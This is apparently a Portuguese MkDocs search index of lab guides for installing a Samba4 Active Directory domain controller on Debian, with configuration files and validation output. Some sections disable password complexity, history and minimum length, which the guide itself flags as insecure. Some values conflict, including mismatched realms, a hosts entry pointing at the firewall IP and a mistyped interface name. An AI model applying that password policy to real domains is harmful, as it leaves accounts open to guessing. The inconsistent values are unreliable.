um script no crontab com o comando:</p> <pre><code>crontab -e\n</code></pre> <p>E insira a linha:</p> <pre><code>0 12 * * 1-5 root rsync -XAavz --delete-after --progress --stats /usr/local/samba/var/locks/sysvol/ srvad2@10.1.1.38:/usr/local/samba/var/locks/sysvol/\n</code></pre> <p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"DC1_pacotes_binarios/","title":"\ud83d\udcc1 DC01 instala\u00e7\u00e3o por pacotes bin\u00e1rios","text":""},{"location":"DC1_pacotes_binarios/#atualizando-o-sistema-operacional","title":"Atualizando o Sistema operacional:","text":"<pre><code>sudo apt update &amp;&amp; sudo apt full-upgrade\n</code></pre>"},{"location":"DC1_pacotes_binarios/#setando-as-configuracoes-e-rede","title":"Setando as Configura\u00e7\u00f5es e rede:","text":"<pre><code>vim /etc/network/interfaces\n</code></pre> <pre><code>allow-hotplug en7s0\niface enp7s0 inet static\naddress 192.168.70.250\nnetmask 255.255.255.0\ngateway 192.168.70.254\n</code></pre>"},{"location":"DC1_pacotes_binarios/#setando-as-configuracoes-de-dns","title":"Setando as Configura\u00e7\u00f5es de DNS:","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>nameserver 192.168.70.254\n</code></pre>"},{"location":"DC1_pacotes_binarios/#setando-as-configuracoes-de-hosts","title":"Setando as Configura\u00e7\u00f5es de hosts:","text":"<pre><code>hostnamectl set-hostname dc01\n</code></pre> <pre><code>vim /etc/hosts\n</code></pre> <pre><code>127.0.0.1 localhost \n127.0.1.1 dc01.esharknet.edu dc01\n192.168.70.250 dc01.esharknet.edu dc01\n</code></pre>"},{"location":"DC1_pacotes_binarios/#instalacao-dos-pacotes-necessarios","title":"Instala\u00e7\u00e3o dos pacotes necess\u00e1rios:","text":"<pre><code>apt install samba smb-client krb5-user krb5-config # VALIDAR: winbind acl attr\n</code></pre> <p>Durante a configura\u00e7\u00e3o do krb5-user, voc\u00ea ser\u00e1 solicitado a inserir as informa\u00e7\u00f5es:</p> <pre><code>- Default Kerberos version 5 realm: ESHARKNET.EDU\n- KDCs for your realm: dc01\n- Administrative server for your Kerberos realm: dc01\n</code></pre> <p>SE vc errar nessa parte, pode rodar o reconfigure para o Kerberos, depois:</p> <pre><code>dpkg-reconfigure krb5.conf\n</code></pre> <p>Siga as instru\u00e7\u00f5es interativas para configurar o dom\u00ednio ESHARKNET.edu. SE precisar siga o modelo abaixo:</p> <pre><code>[libdefaults]\n    default_realm = ESHARKNET.EDU\n    dns_lookup_realm = false\n    dns_lookup_kdc = true\n\n# The following krb5.conf variables are only for MIT Kerberos.\n    kdc_timesync = 1\n    ccache_type = 4\n    forwardable = true\n    proxiable = true\n    rdns = false\n\n# The following libdefaults parameters are only for Heimdal Kerberos.\n    fcc-mit-ticketflags = true\n\n[realms]\n    esharknet.edu = {\n        kdc = dc01.esharknet.edu\n        admin_server = dc01.esharknet.edu\n        default_domain = esharknet.edu\n    }\n\n[domain_realm]\n    .esharknet.edu = ESHARKNET.EDU\n    esharknet.edu = ESHARKNET.EDU\n</code></pre>"},{"location":"DC1_pacotes_binarios/#valide-o-arquivo-do-nsswitchconf","title":"Valide o arquivo do nsswitch.conf:","text":"<p><pre><code>vim /etc/nsswitch.conf\n</code></pre> <pre><code>passwd:       files systemd winbind\ngroup:        files systemd winbind\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#parando-os-servicos-smbd-nmbd-winbind-antes-de-provisionar-o-dominio","title":"Parando os servi\u00e7os <code>smbd</code>, <code>nmbd</code>, <code>winbind</code>, ANTES de provisionar o dom\u00ednio:","text":"<pre><code>systemctl stop smbd nmbd winbind\n\nsystemctl disable smbd nmbd winbind\n</code></pre>"},{"location":"DC1_pacotes_binarios/#efetivando-o-provisionamento-do-dominio","title":"Efetivando o provisionamento do dom\u00ednio:","text":"<pre><code>mv /etc/samba/smb.conf{,.orig}\n</code></pre> <p><pre><code>samba-tool domain provision --use-rfc2307 --interactive\n</code></pre> <pre><code>Realm [ESHARKNET.EDU]: (nome de seu dom\u00ednio completo).\ndc01 [esharknet]: (nome de seu dom\u00ednio abreviado).\nServer Role (dc, member, standalone) [dc]: (tipo de servidor controlador de dom\u00ednio).\nDNS backend (SAMBA_INTERNAL, BIND9_FLATFILE, BIND9_DLZ, NONE) [SAMBA_INTERNAL]: (tipo de servi\u00e7o DNS).\nDNS forwarder IP address (write \u2018none\u2019 to disable forwarding) [192.168.0.1]: (Encaminhador DNS)\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#validando-as-portas-em-escuta","title":"Validando as portas em escuta:","text":"<pre><code>apt install net-tools\n</code></pre> <pre><code>netstat -pultan\n</code></pre>"},{"location":"DC1_pacotes_binarios/#ativando-os-servicos-do-samba-ad-dc","title":"Ativando os servi\u00e7os do <code>samba-ad-dc</code>","text":"<p><pre><code>systemctl unmask samba-ad-dc.service\n</code></pre> <pre><code>systemctl enable samba-ad-dc.service\n</code></pre> <pre><code>systemctl start samba-ad-dc.service\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#revalidando-as-portas-em-escuta","title":"Revalidando as portas em escuta:","text":"<pre><code>apt install net-tools\n</code></pre> <pre><code>netstat -pultan\n</code></pre>"},{"location":"DC1_pacotes_binarios/#reapontando-o-servidor-de-dns-para-o-proprio-dc01","title":"Reapontando o Servidor de DNS para o pr\u00f3prio DC01:","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>nameserver 127.0.0.1\n</code></pre>"},{"location":"DC1_pacotes_binarios/#travando-o-arquivo-contra-alteracoes-automaticas","title":"Travando o arquivo contra altera\u00e7\u00f5es autom\u00e1ticas:","text":"<pre><code>chattr +i /etc/resolv.conf\n</code></pre>"},{"location":"DC1_pacotes_binarios/#configuracao-do-arquivo-smbconf","title":"Configura\u00e7\u00e3o do arquivo <code>smb.conf</code>:","text":"<pre><code>vim /etc/samba/smb.conf\n</code></pre>"},{"location":"DC1_pacotes_binarios/#global-parameters","title":"Global parameters","text":"<pre><code>[global]\n    dns forwarder = 192.168.122.1\n    netbios name = dc01\n    realm = ESHARKNET.EDU\n    server role = active directory domain controller\n    workgroup = ESHARKNET\n    idmap_ldb:use rfc2307 = yes\n\n[sysvol]\n    path = /var/lib/samba/sysvol\n    read only = No\n\n[netlogon]\n    path = /var/lib/samba/sysvol/esharknet.edu/scripts\n    read only = No\n</code></pre>"},{"location":"DC1_pacotes_binarios/#se-for-usar-o-controlador-de-dominio-como-fileserver-nao-recomendado-adiciona-os-campos-ao-smbconf","title":"SE for usar o Controlador de Dom\u00ednio como FileServer (N\u00e3o recomendado!), adiciona os campos ao smb.conf:","text":"<pre><code>[ARQUIVOS]\n    path = /srv/samba/arquivos\n    comment = Compartilhamentos da Rede\n    browsable = yes\n    writable = yes\n    read only = no\n</code></pre>"},{"location":"DC1_pacotes_binarios/#criando-o-diretorio-compartilhado","title":"Criando o diret\u00f3rio compartilhado:","text":"<pre><code>mkdir -p /srv/samba/arquivos\n</code></pre>"},{"location":"DC1_pacotes_binarios/#setando-as-permissoes-de-acesso","title":"Setando as permiss\u00f5es de acesso:","text":"<p><pre><code>wbinfo -g\n</code></pre> <pre><code>chmod -R 0770 /srv/samba/arquivos\nchown -R root:\"domain users\" /srv/samba/arquivos\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#revisando-usuarios-e-grupos","title":"Revisando usu\u00e1rios e grupos:","text":"<p><pre><code>cat /etc/passwd # ( usu\u00e1rios locais do Linux gerencia do LDAP )\n</code></pre> <pre><code>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\ndhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\nsystemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin\nmessagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin\nsshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin\nsuporte:x:1000:1000:Suporte:/home/suporte:/bin/bash\n</code></pre></p> <p><pre><code>samba-tool user list # ( usu\u00e1rios de rede gerenciados pelo SAMBA4 )\n</code></pre> <pre><code>Administrator\nGuest\nkrbtgt\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#outras-validacoes-no-dominio","title":"Outras valida\u00e7\u00f5es no dom\u00ednio:","text":"<p><pre><code>wbinfo -u\n</code></pre> <pre><code>ESHARKNET\\administrator\nESHARKNET\\guest\nESHARKNET\\krbtgt\n</code></pre></p> <p><pre><code>wbinfo -g\n</code></pre> <pre><code>ESHARKNET\\cert publishers\nESHARKNET\\ras and ias servers\nESHARKNET\\allowed rodc password replication group\nESHARKNET\\denied rodc password replication group\nESHARKNET\\dnsadmins\nESHARKNET\\enterprise read-only domain controllers\nESHARKNET\\domain admins\nESHARKNET\\domain users\nESHARKNET\\domain guests\nESHARKNET\\domain computers\nESHARKNET\\domain controllers\nESHARKNET\\schema admins\nESHARKNET\\enterprise admins\nESHARKNET\\group policy creator owners\nESHARKNET\\read-only domain controllers\nESHARKNET\\protected users\nESHARKNET\\dnsupdateproxy\n</code></pre></p> <p><pre><code>wbinfo --ping-dc\n</code></pre> <pre><code>checking the NETLOGON for domain[ESHARNKET dc connection to \"dc01.esharknet.edu\" succeeded\n</code></pre></p> <p><pre><code>wbinfo --all-domains\n</code></pre> <pre><code>BUILTIN\nESHARKNET\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#verificando-servico-ativo","title":"Verificando servi\u00e7o ativo:","text":"<p><pre><code>ps aux | grep samba\n</code></pre> <pre><code>ps ax | egrep \"samba|smbd|nmbd|winbindd\"\n</code></pre> <pre><code>ps axf\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#consultando-o-servidor","title":"Consultando o Servidor:","text":"<p><pre><code>testparm\n</code></pre> <pre><code>Load smb config files from /etc/samba/smb.conf\nLoaded services file OK.\nWeak crypto is allowed by GnuTLS (e.g. NTLM as a compatibility fallback)\n\nServer role: ROLE_ACTIVE_DIRECTORY_DC\n\nPress enter to see a dump of your service definitions\n\n# Global parameters\n[global]\n    dns forwarder = 192.168.70.1\n    passdb backend = samba_dsdb\n    realm = ESHARNKET.INFO\n    server role = active directory domain controller\n    workgroup = ESHARNKET\n    rpc_server:tcpip = no\n    rpc_daemon:spoolssd = embedded\n    rpc_server:spoolss = embedded\n    rpc_server:winreg = embedded\n    rpc_server:ntsvcs = embedded\n    rpc_server:eventlog = embedded\n    rpc_server:srvsvc = embedded\n    rpc_server:svcctl = embedded\n    rpc_server:default = external\n    winbindd:use external pipes = true\n    idmap_ldb:use rfc2307 = yes\n    idmap config * : backend = tdb\n    map archive = No\n    vfs objects = dfs_samba4 acl_xattr\n\n\n[sysvol]\n    path = /var/lib/samba/sysvol\n    read only = No\n\n\n[netlogon]\n    path = /var/lib/samba/sysvol/esharknet.edu/scripts\n    read only = No\n\n\n[ARQUIVOS]\n    comment = Compartilhamentos da Rede\n    path = /srv/samba/Arquivos\n    read only = No\n</code></pre> <pre><code>smbclient --version\n</code></pre> <pre><code>Version 4.22.4-Debian-4.22.4+dfsg-1~deb13u1\n</code></pre></p> <p><pre><code>smbclient -L localhost -U%\n</code></pre> <pre><code>Version 4.22.4-Debian-4.22.4+dfsg-1~deb13u1\nroot@dc01:~# smbclient -L localhost -U%\n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    sysvol          Disk      \n    netlogon        Disk      \n    ARQUIVOS        Disk      Compartilhamentos da Rede\n    IPC$            IPC       IPC Service (Samba 4.22.4-Debian-4.22.4+dfsg-1~deb13u1)\nSMB1 disabled -- no workgroup available\n</code></pre></p> <p><pre><code>samba-tool domain level show\n</code></pre> <pre><code>dc01 and forest function level for dc01 'DC=officinas,DC=edu'\n\nForest function level: (Windows) 2008 R2\ndc01 function level: (Windows) 2008 R2\nLowest function level of a DC: (Windows) 2008 R2\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#desabilitando-a-complexidade-de-senhas-inseguro","title":"Desabilitando a complexidade de senhas (INSEGURO!):","text":"<p><pre><code>samba-tool domain passwordsettings show\n</code></pre> <pre><code>samba-tool domain passwordsettings set --complexity=off\n</code></pre> <pre><code>samba-tool domain passwordsettings set --history-length=0\n</code></pre> <pre><code>samba-tool domain passwordsettings set --min-pwd-length=0\n</code></pre> <pre><code>samba-tool domain passwordsettings set --min-pwd-age=0\n</code></pre> <pre><code>samba-tool user setexpiry Administrator --noexpiry\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#relendo-as-configuracoes-do-samba4","title":"Relendo as configura\u00e7\u00f5es do Samba4:","text":"<pre><code>smbcontrol all reload-config\n</code></pre>"},{"location":"DC1_pacotes_binarios/#validando-a-troca-de-tickets-do-kerberos","title":"Validando a troca de tickets do Kerberos:","text":"<p><pre><code>kinit Administrator@ESHARKNET.EDU\n</code></pre> <pre><code>klist\n</code></pre> <pre><code>Ticket cache: FILE:/tmp/krb5cc_0\nDefault principal: Administrator@ESHARKNET.EDU\n\nValid starting       Expires              Service principal\n23/09/2025 16:35:24  24/09/2025 02:35:24  krbtgt/ESHARKNET.EDU@ESHARKNET.EDU\n    renew until 24/09/2025 16:35:19\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#consultando-servicos-do-kerberos-e-do-ldap","title":"Consultando servi\u00e7os do <code>kerberos</code> e do <code>ldap</code>:","text":"<p><pre><code>host -t A esharknet.edu\n</code></pre> <pre><code>esharknet.edu has address 192.168.70.250\n</code></pre></p> <p><pre><code>Using dc01 server:\nName: esharknet.edu\nAddress: 192.168.70.1#53\nAliases: \n\nA has no SRV record\n</code></pre> <pre><code>host -t srv _kerberos._tcp.ESHARKNET.edu\n</code></pre> <pre><code>_ldap._tcp.esharknet.edu has SRV record 0 100 389 dc01.esharknet.edu.\n</code></pre> <pre><code>host -t srv _ldap._tcp.ESHARKNET.edu\n</code></pre> <pre><code>_kerberos._udp.esharknet.edu has SRV record 0 100 88 dc01.esharknet.edu.\n</code></pre> <pre><code>dig ESHARKNET.EDU\n</code></pre> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.20.11-4-Debian &lt;&lt;&gt;&gt; ESHARKNET.EDU\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 52366\n;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;ESHARKNET.EDU.         IN  A\n\n;; ANSWER SECTION:\nESHARKNET.EDU.      900 IN  A   192.168.70.250\n\n;; AUTHORITY SECTION:\nesharknet.edu.      3600    IN  SOA dc01.esharknet.edu. hostmaster.esharknet.edu. 19 900 600 86400 3600\n\n;; Query time: 4 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; WHEN: Tue Sep 23 16:40:41 -03 2025\n;; MSG SIZE  rcvd: 120\n</code></pre></p>"},{"location":"DC1_pacotes_binarios/#agora-e-so-instalar-as-ferramentas-do-rsat-em-uma-maquina-windows-e-gerenciar-o-servidor","title":"Agora \u00e9 s\u00f3 instalar as ferramentas do <code>rsat</code> em uma m\u00e1quina Windows e gerenciar o Servidor!","text":"<p>THAT\u2019S ALL FOLKS!!</p>"},{"location":"DC1_pacotes_compilados/","title":"\ud83d\udcc1 DC1 instala\u00e7\u00e3o por pacotes compilados","text":""},{"location":"DC1_pacotes_compilados/#controlador-de-dominio-primario-secundario-e-fileserver-no-debian-linux-13","title":"Controlador de Dom\u00ednio Prim\u00e1rio, Secund\u00e1rio e Fileserver no Debian Linux 13","text":""},{"location":"DC1_pacotes_compilados/#layout-de-rede-usado-no-laboratorio","title":"Layout de rede usado no laborat\u00f3rio:","text":"<pre><code>firewall           192.168.70.254 (enp1s0) - 192.168.122.254 (enp7s0) (ssh 2277)\ndcmaster           192.168.70.250   (ssh 22250)\nmkdocs             192.168.70.222   (ssh 22222)\ndcslave            192.168.70.200   (ssh 22200)\nfileserver         192.168.70.150   (ssh 22100)\n\n; firewall         Roteamento por Iptables\n; dcmaster         Controlador de Dom\u00ednio prim\u00e1rio\n; mkdocs           Servidor de Documentos\n; dcslave          Controlador de Dom\u00ednio secund\u00e1rio\n; fileserver       Servidor de Arquivos\n</code></pre>"},{"location":"DC1_pacotes_compilados/#instalando-as-dependencias-para-compilacao-do-codigo-fonte-do-samba4","title":"Instalando as depend\u00eancias para compila\u00e7\u00e3o do c\u00f3digo fonte  do Samba4:","text":"<pre><code>export DEBIAN_FRONTEND=noninteractive;apt-get update; apt-get install vim net-tools rsync acl apt-utils attr autoconf bind9-utils binutils bison build-essential ccache chrpath curl debhelper bind9-dnsutils docbook-xml docbook-xsl flex gcc gdb git glusterfs-common gzip heimdal-multidev hostname htop krb5-config krb5-user lcov libacl1-dev libarchive-dev libattr1-dev libavahi-common-dev libblkid-dev libbsd-dev libcap-dev libcephfs-dev libcups2-dev libdbus-1-dev libglib2.0-dev libgnutls28-dev libgpgme-dev libicu-dev libjansson-dev libjs-jquery libjson-perl libkrb5-dev libldap2-dev liblmdb-dev libncurses-dev libpam0g-dev libparse-yapp-perl libpcap-dev libpopt-dev libreadline-dev libsystemd-dev libtasn1-bin libtasn1-6-dev libunwind-dev lmdb-utils locales lsb-release make mawk mingw-w64 patch perl perl-modules-5.40 pkg-config procps psmisc python3 python3-cryptography python3-dbg python3-dev python3-dnspython python3-gpg python3-iso8601 python3-markdown python3-matplotlib python3-pexpect python3-pyasn1 rsync sed  tar tree uuid-dev wget xfslibs-dev xsltproc zlib1g-dev -y\n</code></pre>"},{"location":"DC1_pacotes_compilados/#setando-e-validando-o-hostname-do-dcmaster","title":"Setando e validando o hostname do dcmaster:","text":"<pre><code>hostnamectl set-hostname dcmaster\n</code></pre>"},{"location":"DC1_pacotes_compilados/#configurando-o-arquivo-de-hosts","title":"Configurando o arquivo de hosts:","text":"<pre><code>vim /etc/hosts\n</code></pre> <pre><code>127.0.0.1          localhost\n127.0.1.1          dcmaster.officinas.edu    dcmaster\n192.168.70.254     dcmaster.officinas.edu    dcmaster\n</code></pre> <pre><code>hostname -f\n</code></pre>"},{"location":"DC1_pacotes_compilados/#setando-ip-fixo-no-servidor-dcmaster","title":"Setando ip fixo no servidor dcmaster:","text":"<pre><code>vim /etc/network/interfaces\n</code></pre> <pre><code>iface enp1s0 inet static\naddress           192.168.70.250\nnetmask           255.255.255.0\ngateway           192.168.70.254\n</code></pre>"},{"location":"DC1_pacotes_compilados/#setando-endereco-do-firewall-como-resolvedor-externo-temporario-ate-provisionar-o-dominio","title":"Setando endere\u00e7o do firewall como resolvedor externo (tempor\u00e1rio at\u00e9 provisionar o dom\u00ednio):","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>nameserver         192.168.70.254 #(firewall)\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-o-ip-da-placa","title":"Validando o ip da placa:","text":"<pre><code>ip -c addr\n</code></pre> <pre><code>ip -br link\n</code></pre>"},{"location":"DC1_pacotes_compilados/#baixando-e-compilando-o-codigo-fonte-do-samba4","title":"Baixando e compilando o c\u00f3digo fonte do Samba4:","text":"<pre><code>wget https://download.samba.org/pub/samba/samba-4.22.1.tar.gz\n</code></pre> <pre><code>tar -xvzf samba-4.22.1.tar.gz\n</code></pre> <pre><code>cd samba-4.22.1\n</code></pre> <pre><code>./configure --prefix=/opt/samba\n</code></pre> <pre><code>make\n</code></pre> <pre><code>make install\n</code></pre>"},{"location":"DC1_pacotes_compilados/#adicionando-optsamba-ao-path-padrao-do-linux-colando-a-linha-completa-ao-final-do-bashrc","title":"Adicionando /opt/Samba ao path padr\u00e3o do Linux, colando a linha completa ao final do .bashrc:","text":""},{"location":"DC1_pacotes_compilados/#pathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinoptsambabinoptsambasbin","title":"PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/samba/bin:/opt/samba/sbin\"","text":"<pre><code>vim ~/.bashrc\n</code></pre> <pre><code>PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/samba/bin:/opt/samba/sbin\"\n</code></pre>"},{"location":"DC1_pacotes_compilados/#relendo-o-arquivo-de-profile","title":"Relendo o arquivo de profile:","text":"<pre><code>source ~/.bashrc\n</code></pre>"},{"location":"DC1_pacotes_compilados/#criando-o-daemon-de-inicializacao-do-samba4-com-o-sistema","title":"Criando o daemon de inicializa\u00e7\u00e3o do Samba4 com o sistema:","text":"<pre><code>vim /etc/systemd/system/samba-ad-dc.service\n</code></pre> <pre><code>[Unit]\n   Description=Samba4 Active Directory Master Domain Controller\n   After=network.target remote-fs.target nss-lookup.target\n\n[Service]\n   Type=forking\n   ExecStart=/opt/samba/sbin/samba -D\n   PIDFile=/opt/samba/var/run/samba.pid\n\n[Install]\n   WantedBy=multi-user.target\n</code></pre> <pre><code>chmod +x /etc/systemd/system/samba-ad-dc.service\n</code></pre>"},{"location":"DC1_pacotes_compilados/#instalando-e-editando-o-servico-de-sincronizacao-de-horario","title":"Instalando e editando o servi\u00e7o de sincroniza\u00e7\u00e3o de hor\u00e1rio:","text":"<pre><code>cp /etc/ntpsec/ntp.conf{,.orig}\n</code></pre> <pre><code>vim /etc/ntpsec/ntp.conf\n</code></pre> <pre><code>driftfile /var/lib/ntpsec/ntp.drift\nleapfile /usr/share/zoneinfo/leap-seconds.list\npool a.ntp.org iburst\npool b.ntp.org iburst\npool 2.debian.pool.ntp.org iburst\npool 3.debian.pool.ntp.org iburst\nrestrict 127.0.0.1\nrestrict ::1\ntinker panic 0 #(Flag usada SOMENTE em VMs)\n</code></pre> <pre><code>systemctl restart ntpd\n</code></pre> <pre><code>ntpq -p\n</code></pre>"},{"location":"DC1_pacotes_compilados/#provisionando-o-novo-dominio-suportado-pelo-dcmaster","title":"Provisionando o novo dom\u00ednio suportado pelo dcmaster:","text":"<pre><code>samba-tool domain provision --use-rfc2307 --interactive --option=\u201dinterfaces=lo enp1s0\u201d --option=\u201dbind interfaces only=yes\u201d\n</code></pre>"},{"location":"DC1_pacotes_compilados/#habilitando-o-daemon-pra-subir-no-boot-do-sistema","title":"Habilitando o daemon pra subir no boot do sistema:","text":"<pre><code>systemctl daemon-reload\n</code></pre> <pre><code>systemctl enable samba-ad-dc.service\n</code></pre> <pre><code>systemctl start samba-ad-dc.service\n</code></pre> <pre><code>systemctl status samba-ad-dc.service\n</code></pre>"},{"location":"DC1_pacotes_compilados/#linkando-o-arquivo-krb5conf-do-samba4-ao-etc-do-sistema","title":"Linkando o arquivo krb5.conf do Samba4 ao /etc do sistema:","text":"<pre><code>mv /etc/krb5.conf{,.orig}\n</code></pre> <pre><code>ln -sf /opt/samba/private/krb5.conf /etc/krb5.conf\n</code></pre>"},{"location":"DC1_pacotes_compilados/#apos-o-provisionamento-da-samba4-precisamos-reconfigurar-o-etcresolvconf-e-setar-o-dns-apontando-a-resolucao-de-nomes-para-o-proprio-dcmaster","title":"AP\u00d3S o provisionamento da Samba4, precisamos reconfigurar o /etc/resolv.conf e setar o DNS apontando a resolu\u00e7\u00e3o de nomes para o pr\u00f3prio dcmaster:","text":"<pre><code>vim /etc/resolv.conf\n</code></pre> <pre><code>domain           officinas.edu\nsearch           officinas.edu.\nnameserver       127.0.0.1 #(localhost)\n</code></pre>"},{"location":"DC1_pacotes_compilados/#bloqueando-alteracao-do-resolvconf","title":"Bloqueando altera\u00e7\u00e3o do resolv.conf:","text":"<pre><code>chattr +i /etc/resolv.conf\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-resolvedor-de-nomes-pelo-dcmaster","title":"Validando resolvedor de nomes pelo dcmaster:","text":"<pre><code>nslookup dcmaster.officinas.edu\n</code></pre>"},{"location":"DC1_pacotes_compilados/#vai-validar-na-tela","title":"Vai validar na tela:","text":"<pre><code>Server:         127.0.0.1\nAddress:        127.0.0.1#53\n\nName:   dcmaster.officinas.edu\nAddress: 192.168.70.250\n</code></pre>"},{"location":"DC1_pacotes_compilados/#reboot-do-servidor-dcmaster","title":"Reboot do servidor dcmaster:","text":"<pre><code>reboot\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-os-servicos-do-samba4-no-boot-do-sistema","title":"Validando os servi\u00e7os do Samba4 no boot do sistema:","text":"<pre><code>ps aux | grep samba\n</code></pre> <pre><code>ps aux | egrep \"samba|smbd|nmbd|winbind\"\n</code></pre> <pre><code>find / -name samba.pid\n</code></pre> <pre><code>pgrep samba\n</code></pre>"},{"location":"DC1_pacotes_compilados/#dando-poderes-de-root-ao-administrator","title":"Dando poderes de root ao Administrator:","text":"<pre><code>vim /opt/samba/etc/user.map\n</code></pre> <pre><code>!root=officinas.edu\\Administrator\n</code></pre>"},{"location":"DC1_pacotes_compilados/#linkando-bibliotecas-do-samba4-para-mapeamento-de-usuarios-no-sistema-linux-rode-esses-comandos-manualmente-sem-copiar-e-colar","title":"Linkando bibliotecas do Samba4 para mapeamento de usu\u00e1rios no sistema Linux (rode esses comandos manualmente sem copiar e colar):","text":"<pre><code>/opt/samba/sbin/smbd -b | grep LIBDIR\n</code></pre> <pre><code>ln -s /opt/samba/lib/libnss_winbind.so.2 /lib/x86-64-linux-gnu\n</code></pre> <pre><code>ln -s /lib/x86_64-linux-gnu/libnss_winbind.so.2 /lib/x86_64-linux-gnu/libnss_winbind.so\n</code></pre> <pre><code>ldconfig\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-a-autenticacao-de-usuarios-de-rede-no-sistema-linux-mas-tbem-no-winbind","title":"Validando a autentica\u00e7\u00e3o de usu\u00e1rios de rede no sistema Linux mas tb\u00e9m no winbind:","text":"<pre><code>vim /etc/nsswitch.conf\n</code></pre> <pre><code>passwd: files systemd winbind\ngroup: files systemd winbind\nshadow: files\n</code></pre>"},{"location":"DC1_pacotes_compilados/#editando-o-arquivo-smbconf-e-adicionando-no-dns-forwarder-quem-resolve-nomes-para-consultas-externas-o-firewall-e-o-google","title":"Editando o arquivo smb.conf e adicionando no dns forwarder, quem resolve nomes para consultas externas (o firewall e o google):","text":"<pre><code>cp /opt/samba/etc/smb.conf{,.orig}\n</code></pre> <pre><code>vim /opt/samba/etc/smb.conf\n</code></pre> <pre><code>[global]\n      bind interfaces only = Yes\n      dns forwarder = 192.168.70.254 8.8.8.8 #(firewall + google)\n      interfaces = lo enp1s0\n      netbios name = DCMASTER\n      realm = OFFICINAS.EDU\n      server role = active directory domain controller\n      workgroup = OFFICINAS\n      idmap_ldb:use rfc2307 = yes\n\n[sysvol]\n      path = /opt/samba/var/locks/sysvol\n      read only = No\n\n[netlogon]\n      path = /opt/samba/var/locks/sysvol/officinas.edu/scripts\n      read only = No\n</code></pre>"},{"location":"DC1_pacotes_compilados/#relendo-a-configuracao-do-samba4","title":"Relendo a configura\u00e7\u00e3o do Samba4:","text":"<pre><code>smbcontrol all reload-config\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-usuarios-da-base-do-ldap-local","title":"Validando usu\u00e1rios da base do ldap local:","text":"<pre><code>cat /etc/passwd | grep root\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-usuarios-de-rede-do-samba4-intermediados-pelo-winbind","title":"Validando usu\u00e1rios de rede do Samba4 (Intermediados pelo winbind):","text":"<pre><code>samba-tool user show administrator\n</code></pre> <pre><code>getent passwd administrator\n</code></pre> <pre><code>wbinfo -u\n</code></pre> <pre><code>wbinfo -g\n</code></pre> <pre><code>wbinfo --ping-dc\n</code></pre> <pre><code>getent group \"Domain Admins\"\n</code></pre>"},{"location":"DC1_pacotes_compilados/#validando-daemons-ativos","title":"Validando daemons ativos:","text":"<pre><code>ps aux | egrep \"samba|smbd|nmbd|winbind\"\n</code></pre> <pre><code>ps axf\n</code></pre>"},{"location":"DC1_pacotes_compilados/#consultando-servicos-do-samba4","title":"Consultando servi\u00e7os do SAMBA4:","text":"<pre><code>smbclient --version\n</code></pre> <pre><code>smbclient -L dc01 -U Administrator\n</code></pre> <pre><code>smbclient //localhost/netlogon -UAdministrator -c \"ls\"\n</code></pre> <pre><code>testparm\n</code></pre> <pre><code>samba-tool domain level show\n</code></pre>"},{"location":"DC1_pacotes_compilados/#desabilitando-complexidade-de-senhas-inseguro","title":"Desabilitando complexidade de senhas (inseguro):","text":"<pre><code>samba-tool domain passwordsettings show\n</code></pre> <pre><code>samba-tool domain passwordsettings set --complexity=off\n</code></pre> <pre><code>samba-tool domain passwordsettings set --history-length=0\n</code></pre> <pre><code>samba-tool domain passwordsettings set --min-pwd-length=0\n</code></pre> <pre><code>samba-tool domain passwordsettings set --min-pwd-age=0\n</code></pre> <pre><code>samba-tool user 